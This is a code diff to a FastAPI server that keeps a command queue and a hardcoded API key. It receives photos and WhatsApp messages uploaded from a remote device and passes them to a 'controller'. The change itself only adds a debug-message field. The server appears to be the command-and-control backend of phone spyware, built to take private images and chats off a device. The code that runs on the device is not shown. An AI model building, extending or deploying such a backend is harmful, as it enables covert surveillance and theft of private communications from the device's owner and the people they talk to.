@@ -1,16 +1,13 @@
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
-from typing import Dict, List
-import json
-import os
-import base64
+from fastapi import FastAPI, Request, HTTPException
 
 app = FastAPI()
 API_KEY = "MY_SECRET_KEY_123" 
 
 device_data = {} 
 command_queue = []
-latest_image_b64 = "" # Holds the latest photo
-latest_wa_chats = []  # Holds WhatsApp messages
+latest_image_b64 = "" 
+latest_wa_chats = []  
+debug_msg = "No debug info yet" # NEW
 
 def check_key(request: Request):
     if request.headers.get("X-Key") != API_KEY:
@@ -27,14 +24,16 @@ async def get_commands(request: Request):
 
 @app.post("/result")
 async def post_result(request: Request):
-    global latest_image_b64
+    global latest_image_b64, debug_msg
     check_key(request)
     data = await request.json()
     
-    # If the result contains a photo, save it
+    if "debug_text" in data:
+        debug_msg = data["debug_text"]
+        
     if "image_b64" in data:
         latest_image_b64 = data["image_b64"]
-        print("Received new photo from device!")
+        print(f"Received photo! Size: {len(latest_image_b64)} chars")
         
     return {"status": "ok"}
 
@@ -43,14 +42,10 @@ async def post_wa(request: Request):
     global latest_wa_chats
     check_key(request)
     data = await request.json()
-    
-    # Add new messages to the front of the list
     if "messages" in data:
         for msg in data["messages"]:
             latest_wa_chats.insert(0, msg)
-        # Keep only last 50 messages to save memory
         latest_wa_chats = latest_wa_chats[:50] 
-        
     return {"status": "ok"}
 
 @app.get("/state")
@@ -59,7 +54,8 @@ async def get_state(request: Request):
     return {
         "devices": device_data,
         "latest_image_b64": latest_image_b64,
-        "wa_chats": latest_wa_chats
+        "wa_chats": latest_wa_chats,
+        "debug_msg": debug_msg # Send debug msg to controller
     }
 
 @app.post("/queue_cmd")
